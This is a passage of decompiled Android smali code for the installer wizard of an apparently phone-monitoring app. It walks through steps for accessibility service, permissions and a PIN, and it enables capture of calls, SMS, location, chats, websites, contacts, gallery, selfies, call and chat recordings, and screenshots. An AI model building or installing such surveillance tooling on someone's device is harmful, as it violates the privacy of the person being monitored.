.class public Lhw/installer/ActivityInstaller;
.super Lb/j/a/e;
.source ""

# interfaces
.implements Ljava/util/Observer;


# static fields
.field private static final q:Ljava/lang/String;


# instance fields
.field private n:Lhw/installer/b;

.field private o:Ljava/util/Stack;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/Stack<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation
.end field

.field private p:Lhw/installer/a;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const-class v0, Lhw/installer/ActivityInstaller;

    invoke-virtual {v0}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lhw/installer/ActivityInstaller;->q:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Lb/j/a/e;-><init>()V

    new-instance v0, Ljava/util/Stack;

    invoke-direct {v0}, Ljava/util/Stack;-><init>()V

    iput-object v0, p0, Lhw/installer/ActivityInstaller;->o:Ljava/util/Stack;

    return-void
.end method

.method private A(Lb/j/a/d;)V
    .locals 2

    :try_start_0
    invoke-virtual {p0}, Lb/j/a/e;->n()Lb/j/a/i;

    move-result-object v0

    invoke-virtual {v0}, Lb/j/a/i;->a()Lb/j/a/n;

    move-result-object v0

    sget v1, Lhw/installer/c;->t:I

    invoke-virtual {v0, v1, p1}, Lb/j/a/n;->f(ILb/j/a/d;)Lb/j/a/n;

    invoke-virtual {v0}, Lb/j/a/n;->c()I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    sget-object v0, Lhw/installer/ActivityInstaller;->q:Ljava/lang/String;

    const-string v1, "showFragment()"

    invoke-static {v0, v1, p1}, Lhw/utils/l;->u(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Exception;)V

    :goto_0
    return-void
.end method

.method private B()V
    .locals 4

    sget-object v0, Lhw/installer/ActivityInstaller;->q:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "****** "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-virtual {v2}, Lhw/installer/b;->O()Z

    move-result v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    const-string v2, " "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-virtual {v3}, Lhw/installer/b;->D()Lhw/utils/b0$a;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-virtual {v3}, Lhw/installer/b;->P()Z

    move-result v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-virtual {v3}, Lhw/installer/b;->K()Z

    move-result v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-virtual {v2}, Lhw/installer/b;->T()Z

    move-result v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Lhw/utils/l;->s(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-virtual {v0}, Lhw/installer/b;->K()Z

    move-result v0

    if-nez v0, :cond_5

    iget-object v0, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-virtual {v0}, Lhw/installer/b;->T()Z

    move-result v0

    if-nez v0, :cond_5

    iget-object v0, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-virtual {v0}, Lhw/installer/b;->O()Z

    move-result v0

    if-nez v0, :cond_0

    invoke-static {}, Lhw/installer/FragmentInstallHello;->v1()Lhw/installer/FragmentInstallHello;

    move-result-object v0

    goto/16 :goto_2

    :cond_0
    sget-object v0, Lhw/utils/b0$a;->e:Lhw/utils/b0$a;

    iget-object v1, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-virtual {v1}, Lhw/installer/b;->D()Lhw/utils/b0$a;

    move-result-object v1

    if-ne v0, v1, :cond_1

    invoke-static {}, Lhw/installer/FragmentInstallMonitorType;->v1()Lhw/installer/FragmentInstallMonitorType;

    move-result-object v0

    goto/16 :goto_2

    :cond_1
    iget-object v0, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-virtual {v0}, Lhw/installer/b;->P()Z

    move-result v0

    if-nez v0, :cond_2

    invoke-static {}, Lhw/installer/FragmentInstallLicense;->v1()Lhw/installer/FragmentInstallLicense;

    move-result-object v0

    goto/16 :goto_2

    :cond_2
    iget-object v0, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-virtual {v0}, Lhw/installer/b;->L()Z

    move-result v0

    if-nez v0, :cond_3

    invoke-static {}, Lhw/installer/FragmentInstallCheckOldVersions;->w1()Z

    move-result v0

    if-eqz v0, :cond_3

    goto :goto_0

    :cond_3
    invoke-virtual {p0}, Lhw/installer/ActivityInstaller;->z()Z

    move-result v0

    if-eqz v0, :cond_4

    goto :goto_1

    :cond_4
    invoke-static {}, Lhw/installer/FragmentInstallLogin;->A1()Lhw/installer/FragmentInstallLogin;

    move-result-object v0

    goto/16 :goto_2

    :cond_5
    iget-object v0, p0, Lhw/installer/ActivityInstaller;->p:Lhw/installer/a;

    if-eqz v0, :cond_6

    invoke-virtual {v0}, Lhw/installer/a;->r1()Ljava/lang/String;

    move-result-object v0

    const-string v1, "hw.installer.FragmentInstallLogin"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_6

    iget-object v0, p0, Lhw/installer/ActivityInstaller;->o:Ljava/util/Stack;

    invoke-virtual {v0}, Ljava/util/Stack;->clear()V

    const/4 v0, 0x0

    iput-object v0, p0, Lhw/installer/ActivityInstaller;->p:Lhw/installer/a;

    :cond_6
    iget-object v0, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-virtual {v0}, Lhw/installer/b;->T()Z

    move-result v0

    if-eqz v0, :cond_7

    iget-object v0, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-virtual {v0}, Lhw/installer/b;->L()Z

    move-result v0

    if-nez v0, :cond_7

    invoke-static {}, Lhw/installer/FragmentInstallCheckOldVersions;->w1()Z

    move-result v0

    if-eqz v0, :cond_7

    :goto_0
    invoke-static {}, Lhw/installer/FragmentInstallCheckOldVersions;->x1()Lhw/installer/FragmentInstallCheckOldVersions;

    move-result-object v0

    goto :goto_2

    :cond_7
    invoke-virtual {p0}, Lhw/installer/ActivityInstaller;->z()Z

    move-result v0

    if-eqz v0, :cond_8

    :goto_1
    invoke-static {}, Lhw/installer/FragmentInstallSysPermissions;->c2()Lhw/installer/FragmentInstallSysPermissions;

    move-result-object v0

    goto :goto_2

    :cond_8
    iget-object v0, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-virtual {v0}, Lhw/installer/b;->Q()Z

    move-result v0

    if-nez v0, :cond_a

    iget-object v0, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-virtual {v0}, Lhw/installer/b;->T()Z

    move-result v0

    if-eqz v0, :cond_9

    invoke-direct {p0}, Lhw/installer/ActivityInstaller;->y()Z

    :cond_9
    invoke-static {}, Lhw/installer/FragmentInstallLogSelection;->M1()Lhw/installer/FragmentInstallLogSelection;

    move-result-object v0

    goto :goto_2

    :cond_a
    iget-object v0, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-virtual {v0}, Lhw/installer/b;->m0()Z

    move-result v0

    if-nez v0, :cond_b

    invoke-static {}, Lhw/installer/FragmentInstallAccessibilityService;->N1()Lhw/installer/FragmentInstallAccessibilityService;

    move-result-object v0

    goto :goto_2

    :cond_b
    iget-object v0, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-virtual {v0}, Lhw/installer/b;->n0()Z

    move-result v0

    if-nez v0, :cond_c

    invoke-static {}, Lhw/installer/FragmentInstallScreenshots;->P1()Lhw/installer/FragmentInstallScreenshots;

    move-result-object v0

    goto :goto_2

    :cond_c
    iget-object v0, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-virtual {v0}, Lhw/installer/b;->R()Z

    move-result v0

    if-nez v0, :cond_d

    invoke-static {}, Lhw/installer/FragmentInstallPIN;->x1()Lhw/installer/FragmentInstallPIN;

    move-result-object v0

    goto :goto_2

    :cond_d
    iget-object v0, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-virtual {v0}, Lhw/installer/b;->N()Z

    move-result v0

    if-nez v0, :cond_11

    invoke-static {}, Lhw/installer/FragmentInstallFinish;->v1()Lhw/installer/FragmentInstallFinish;

    move-result-object v0

    :goto_2
    iget-object v1, p0, Lhw/installer/ActivityInstaller;->p:Lhw/installer/a;

    if-eqz v1, :cond_e

    iget-object v2, p0, Lhw/installer/ActivityInstaller;->o:Ljava/util/Stack;

    invoke-virtual {v1}, Lhw/installer/a;->r1()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Ljava/util/Stack;->push(Ljava/lang/Object;)Ljava/lang/Object;

    :cond_e
    iget-object v1, p0, Lhw/installer/ActivityInstaller;->p:Lhw/installer/a;

    if-eqz v1, :cond_f

    invoke-virtual {v1}, Lhw/installer/a;->r1()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0}, Lhw/installer/a;->r1()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_10

    :cond_f
    iput-object v0, p0, Lhw/installer/ActivityInstaller;->p:Lhw/installer/a;

    invoke-direct {p0, v0}, Lhw/installer/ActivityInstaller;->A(Lb/j/a/d;)V

    :cond_10
    return-void

    :cond_11
    iget-object v0, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-virtual {v0}, Lhw/installer/b;->V()V

    const/4 v0, -0x1

    invoke-virtual {p0, v0}, Landroid/app/Activity;->setResult(I)V

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    return-void
.end method

.method static synthetic w(Lhw/installer/ActivityInstaller;)V
    .locals 0

    invoke-direct {p0}, Lhw/installer/ActivityInstaller;->B()V

    return-void
.end method

.method static synthetic x()Ljava/lang/String;
    .locals 1

    sget-object v0, Lhw/installer/ActivityInstaller;->q:Ljava/lang/String;

    return-object v0
.end method

.method private y()Z
    .locals 8

    invoke-static {}, Lhw/utils/y;->f0()V

    invoke-static {}, Lhw/utils/z;->K0()V

    iget-object v0, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-virtual {v0}, Lhw/installer/b;->y()Ljava/io/File;

    move-result-object v0

    invoke-static {v0}, Lhw/utils/o;->e(Ljava/io/File;)Z

    move-result v0

    if-eqz v0, :cond_0

    sget-object v1, Lhw/installer/ActivityInstaller;->q:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "****** bUs "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-virtual {v3}, Lhw/installer/b;->K()Z

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    const-string v3, "  "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {}, Lhw/utils/z;->u()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Lhw/utils/l;->s(Ljava/lang/String;Ljava/lang/String;)V

    sget-object v1, Lhw/utils/z$a;->b:Lhw/utils/z$a;

    invoke-static {v1}, Lhw/utils/z;->z0(Lhw/utils/z$a;)V

    iget-object v1, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    const/16 v2, 0x138

    invoke-static {v2}, Lhw/utils/y;->L(I)Z

    move-result v3

    const-string v4, "CALLS"

    invoke-virtual {v1, v4, v3}, Lhw/installer/b;->X(Ljava/lang/String;Z)V

    iget-object v1, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    const/16 v3, 0x13a

    invoke-static {v3}, Lhw/utils/y;->L(I)Z

    move-result v3

    const-string v4, "LOCATION"

    invoke-virtual {v1, v4, v3}, Lhw/installer/b;->X(Ljava/lang/String;Z)V

    iget-object v1, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    const/16 v3, 0x139

    invoke-static {v3}, Lhw/utils/y;->L(I)Z

    move-result v4

    const-string v5, "SMS"

    invoke-virtual {v1, v5, v4}, Lhw/installer/b;->X(Ljava/lang/String;Z)V

    iget-object v1, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    const/16 v4, 0x13d

    invoke-static {v4}, Lhw/utils/y;->L(I)Z

    move-result v4

    const-string v5, "SELFIE"

    invoke-virtual {v1, v5, v4}, Lhw/installer/b;->X(Ljava/lang/String;Z)V

    iget-object v1, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    const/16 v4, 0x13f

    invoke-static {v4}, Lhw/utils/y;->L(I)Z

    move-result v4

    const-string v5, "GALLERY"

    invoke-virtual {v1, v5, v4}, Lhw/installer/b;->X(Ljava/lang/String;Z)V

    iget-object v1, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    const/16 v4, 0x133

    invoke-static {v4}, Lhw/utils/y;->L(I)Z

    move-result v4

    const-string v5, "APPS"

    invoke-virtual {v1, v5, v4}, Lhw/installer/b;->X(Ljava/lang/String;Z)V

    iget-object v1, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    const/16 v4, 0x12d

    invoke-static {v4}, Lhw/utils/y;->L(I)Z

    move-result v4

    const-string v5, "TEXT"

    invoke-virtual {v1, v5, v4}, Lhw/installer/b;->X(Ljava/lang/String;Z)V

    iget-object v1, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    const/16 v4, 0x13b

    invoke-static {v4}, Lhw/utils/y;->L(I)Z

    move-result v4

    const-string v5, "CONTACTS"

    invoke-virtual {v1, v5, v4}, Lhw/installer/b;->X(Ljava/lang/String;Z)V

    iget-object v1, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    const/16 v4, 0x13c

    invoke-static {v4}, Lhw/utils/y;->L(I)Z

    move-result v4

    const-string v5, "CALENDAR"

    invoke-virtual {v1, v5, v4}, Lhw/installer/b;->X(Ljava/lang/String;Z)V

    iget-object v1, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    const/16 v4, 0x134

    invoke-static {v4}, Lhw/utils/y;->L(I)Z

    move-result v4

    const-string v5, "SYSTEM"

    invoke-virtual {v1, v5, v4}, Lhw/installer/b;->X(Ljava/lang/String;Z)V

    iget-object v1, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    const/16 v4, 0x130

    invoke-static {v4}, Lhw/utils/y;->L(I)Z

    move-result v5

    const-string v6, "CHATS"

    invoke-virtual {v1, v6, v5}, Lhw/installer/b;->X(Ljava/lang/String;Z)V

    iget-object v1, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    const/16 v5, 0x131

    invoke-static {v5}, Lhw/utils/y;->L(I)Z

    move-result v6

    const-string v7, "WEBSITES"

    invoke-virtual {v1, v7, v6}, Lhw/installer/b;->X(Ljava/lang/String;Z)V

    iget-object v1, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-static {v2}, Lhw/utils/y;->I(I)Z

    move-result v2

    const-string v6, "CALLREC"

    invoke-virtual {v1, v6, v2}, Lhw/installer/b;->X(Ljava/lang/String;Z)V

    iget-object v1, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-static {v4}, Lhw/utils/y;->I(I)Z

    move-result v2

    const-string v6, "CHATREC"

    invoke-virtual {v1, v6, v2}, Lhw/installer/b;->X(Ljava/lang/String;Z)V

    iget-object v1, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    const/16 v2, 0x12e

    invoke-static {v2}, Lhw/utils/y;->L(I)Z

    move-result v2

    const-string v6, "SCREENSHOTS"

    invoke-virtual {v1, v6, v2}, Lhw/installer/b;->X(Ljava/lang/String;Z)V

    iget-object v1, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-static {v5}, Lhw/utils/y;->O(I)Z

    move-result v2

    const-string v5, "WEBSCREENSHOTS"

    invoke-virtual {v1, v5, v2}, Lhw/installer/b;->X(Ljava/lang/String;Z)V

    iget-object v1, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-static {v4}, Lhw/utils/y;->O(I)Z

    move-result v2

    const-string v4, "IMSCREENSHOTS"

    invoke-virtual {v1, v4, v2}, Lhw/installer/b;->X(Ljava/lang/String;Z)V

    iget-object v1, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-static {v3}, Lhw/utils/y;->O(I)Z

    move-result v2

    const-string v3, "SMSSCREENSHOTS"

    invoke-virtual {v1, v3, v2}, Lhw/installer/b;->X(Ljava/lang/String;Z)V

    :cond_0
    return v0
.end method


# virtual methods
.method public onBackPressed()V
    .locals 5

    const/4 v0, 0x0

    const/4 v1, 0x0

    :try_start_0
    iget-object v2, p0, Lhw/installer/ActivityInstaller;->p:Lhw/installer/a;

    if-eqz v2, :cond_0

    invoke-virtual {v2}, Lhw/installer/a;->s1()V

    :cond_0
    iget-object v2, p0, Lhw/installer/ActivityInstaller;->o:Ljava/util/Stack;

    invoke-virtual {v2}, Ljava/util/Stack;->pop()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/String;

    const/4 v3, -0x1

    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v4

    sparse-switch v4, :sswitch_data_0

    goto/16 :goto_0

    :sswitch_0
    const-string v4, "hw.installer.FragmentInstallPIN"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    const/16 v3, 0x9

    goto/16 :goto_0

    :sswitch_1
    const-string v4, "hw.installer.FragmentInstallMonitorType"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    const/4 v3, 0x3

    goto :goto_0

    :sswitch_2
    const-string v4, "hw.installer.FragmentInstallFinish"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    const/16 v3, 0xa

    goto :goto_0

    :sswitch_3
    const-string v4, "hw.installer.FragmentInstallLogSelection"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    const/4 v3, 0x5

    goto :goto_0

    :sswitch_4
    const-string v4, "hw.installer.FragmentInstallLicense"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    const/4 v3, 0x1

    goto :goto_0

    :sswitch_5
    const-string v4, "hw.installer.FragmentInstallCheckOldVersions"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    const/4 v3, 0x2

    goto :goto_0

    :sswitch_6
    const-string v4, "hw.installer.FragmentInstallAccessibilityService"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    const/4 v3, 0x7

    goto :goto_0

    :sswitch_7
    const-string v4, "hw.installer.FragmentInstallSysPermissions"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    const/4 v3, 0x6

    goto :goto_0

    :sswitch_8
    const-string v4, "hw.installer.FragmentInstallScreenshots"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    const/16 v3, 0x8

    goto :goto_0

    :sswitch_9
    const-string v4, "hw.installer.FragmentInstallLogin"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    const/4 v3, 0x4

    goto :goto_0

    :sswitch_a
    const-string v4, "hw.installer.FragmentInstallHello"

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    const/4 v3, 0x0

    :cond_1
    :goto_0
    packed-switch v3, :pswitch_data_0

    sget-object v2, Lhw/installer/ActivityInstaller;->q:Ljava/lang/String;

    goto :goto_2

    :pswitch_0
    invoke-static {}, Lhw/installer/FragmentInstallFinish;->v1()Lhw/installer/FragmentInstallFinish;

    move-result-object v2

    :goto_1
    iput-object v2, p0, Lhw/installer/ActivityInstaller;->p:Lhw/installer/a;

    goto :goto_3

    :pswitch_1
    invoke-static {}, Lhw/installer/FragmentInstallPIN;->x1()Lhw/installer/FragmentInstallPIN;

    move-result-object v2

    goto :goto_1

    :pswitch_2
    invoke-static {}, Lhw/installer/FragmentInstallScreenshots;->P1()Lhw/installer/FragmentInstallScreenshots;

    move-result-object v2

    goto :goto_1

    :pswitch_3
    invoke-static {}, Lhw/installer/FragmentInstallAccessibilityService;->N1()Lhw/installer/FragmentInstallAccessibilityService;

    move-result-object v2

    goto :goto_1

    :pswitch_4
    invoke-static {}, Lhw/installer/FragmentInstallSysPermissions;->c2()Lhw/installer/FragmentInstallSysPermissions;

    move-result-object v2

    goto :goto_1

    :pswitch_5
    invoke-static {}, Lhw/installer/FragmentInstallLogSelection;->M1()Lhw/installer/FragmentInstallLogSelection;

    move-result-object v2

    goto :goto_1

    :pswitch_6
    invoke-static {}, Lhw/installer/FragmentInstallLogin;->A1()Lhw/installer/FragmentInstallLogin;

    move-result-object v2

    goto :goto_1

    :pswitch_7
    invoke-static {}, Lhw/installer/FragmentInstallMonitorType;->v1()Lhw/installer/FragmentInstallMonitorType;

    move-result-object v2

    goto :goto_1

    :pswitch_8
    invoke-static {}, Lhw/installer/FragmentInstallCheckOldVersions;->x1()Lhw/installer/FragmentInstallCheckOldVersions;

    move-result-object v2

    goto :goto_1

    :pswitch_9
    invoke-static {}, Lhw/installer/FragmentInstallLicense;->v1()Lhw/installer/FragmentInstallLicense;

    move-result-object v2

    goto :goto_1

    :pswitch_a
    invoke-static {}, Lhw/installer/FragmentInstallHello;->v1()Lhw/installer/FragmentInstallHello;

    move-result-object v2

    goto :goto_1

    :goto_2
    const-string v3, "unknown installation stage!"

    invoke-static {v2, v3}, Lhw/utils/l;->s(Ljava/lang/String;Ljava/lang/String;)V

    iput-object v1, p0, Lhw/installer/ActivityInstaller;->p:Lhw/installer/a;
    :try_end_0
    .catch Ljava/util/EmptyStackException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_3

    :catch_0
    sget-object v2, Lhw/installer/ActivityInstaller;->q:Ljava/lang/String;

    const-string v3, "empty installation stack!"

    invoke-static {v2, v3}, Lhw/utils/l;->s(Ljava/lang/String;Ljava/lang/String;)V

    iput-object v1, p0, Lhw/installer/ActivityInstaller;->p:Lhw/installer/a;

    :goto_3
    iget-object v1, p0, Lhw/installer/ActivityInstaller;->p:Lhw/installer/a;

    if-eqz v1, :cond_2

    invoke-direct {p0, v1}, Lhw/installer/ActivityInstaller;->A(Lb/j/a/d;)V

    goto :goto_4

    :cond_2
    sget-object v1, Lhw/installer/ActivityInstaller;->q:Ljava/lang/String;

    const-string v2, "cancel installation"

    invoke-static {v1, v2}, Lhw/utils/l;->s(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {p0, v0}, Landroid/app/Activity;->setResult(I)V

    invoke-super {p0}, Lb/j/a/e;->onBackPressed()V

    :goto_4
    return-void

    :sswitch_data_0
    .sparse-switch
        -0x6c6cca14 -> :sswitch_a
        -0x6c2ff37d -> :sswitch_9
        -0x673a7699 -> :sswitch_8
        -0x5eca7463 -> :sswitch_7
        -0x52b60ad3 -> :sswitch_6
        -0x2d5829a0 -> :sswitch_5
        -0x2a783d25 -> :sswitch_4
        -0x2923d3b2 -> :sswitch_3
        -0x245ced47 -> :sswitch_2
        -0x7971ab2 -> :sswitch_1
        -0x41bb6d1 -> :sswitch_0
    .end sparse-switch

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_a
        :pswitch_9
        :pswitch_8
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3

    invoke-super {p0, p1}, Lb/j/a/e;->onCreate(Landroid/os/Bundle;)V

    if-eqz p1, :cond_0

    const/4 v0, 0x1

    :goto_0
    add-int/lit8 v1, v0, 0x1

    invoke-static {v0}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_0

    iget-object v2, p0, Lhw/installer/ActivityInstaller;->o:Ljava/util/Stack;

    invoke-virtual {v2, v0}, Ljava/util/Stack;->push(Ljava/lang/Object;)Ljava/lang/Object;

    move v0, v1

    goto :goto_0

    :cond_0
    sget v0, Lhw/installer/d;->a:I

    invoke-virtual {p0, v0}, Landroid/app/Activity;->setContentView(I)V

    invoke-static {p0}, Landroidx/lifecycle/v;->b(Lb/j/a/e;)Landroidx/lifecycle/u;

    move-result-object v0

    const-class v1, Lhw/installer/b;

    invoke-virtual {v0, v1}, Landroidx/lifecycle/u;->a(Ljava/lang/Class;)Landroidx/lifecycle/t;

    move-result-object v0

    check-cast v0, Lhw/installer/b;

    iput-object v0, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    invoke-static {}, Lhw/utils/o;->l0()Ljava/io/File;

    move-result-object v1

    invoke-virtual {v0, v1}, Lhw/installer/b;->i0(Ljava/io/File;)V

    sget-boolean v0, Lhw/utils/b0;->y:Z

    if-nez v0, :cond_1

    invoke-static {}, Lhw/utils/z;->b0()Z

    move-result v0

    if-nez v0, :cond_1

    iget-object v0, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Lhw/installer/b;->Y(Z)V

    :cond_1
    if-nez p1, :cond_2

    invoke-direct {p0}, Lhw/installer/ActivityInstaller;->B()V

    :cond_2
    return-void
.end method

.method protected onDestroy()V
    .locals 0

    invoke-super {p0}, Lb/j/a/e;->onDestroy()V

    return-void
.end method

.method protected onPause()V
    .locals 0

    invoke-super {p0}, Lb/j/a/e;->onPause()V

    return-void
.end method

.method protected onResume()V
    .locals 0

    invoke-super {p0}, Lb/j/a/e;->onResume()V

    return-void
.end method

.method protected onSaveInstanceState(Landroid/os/Bundle;)V
    .locals 4

    iget-object v0, p0, Lhw/installer/ActivityInstaller;->o:Ljava/util/Stack;

    invoke-virtual {v0}, Ljava/util/Stack;->iterator()Ljava/util/Iterator;

    move-result-object v0

    const/4 v1, 0x1

    :goto_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_0

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/String;

    add-int/lit8 v3, v1, 0x1

    invoke-static {v1}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1, v2}, Landroid/os/Bundle;->putString(Ljava/lang/String;Ljava/lang/String;)V

    move v1, v3

    goto :goto_0

    :cond_0
    invoke-super {p0, p1}, Lb/j/a/e;->onSaveInstanceState(Landroid/os/Bundle;)V

    return-void
.end method

.method protected onStart()V
    .locals 3

    :try_start_0
    iget-object v0, p0, Lhw/installer/ActivityInstaller;->n:Lhw/installer/b;

